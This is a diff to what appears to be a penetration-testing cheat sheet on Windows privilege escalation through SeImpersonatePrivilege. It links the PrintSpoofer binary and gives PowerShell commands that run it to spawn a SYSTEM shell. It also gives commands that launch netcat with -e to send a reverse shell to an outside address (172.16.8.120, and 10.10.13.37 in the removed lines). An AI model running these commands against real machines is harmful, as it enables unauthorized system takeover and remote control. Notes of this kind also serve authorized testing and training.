@@ -24,8 +24,8 @@ SeImpersonatePrivilege                  Impersonate a client after authenticatio
 
 [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe)
 ```powershell
-.\PrintSpoofer.exe -i -c cmd
-.\PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
+.\PrintSpoofer32.exe -i -c cmd
+.\PrintSpoofer32.exe -c "C:\programdata\nc.exe 172.16.8.120 1337 -e powershell.exe"
 ```
 
 Meterpreter
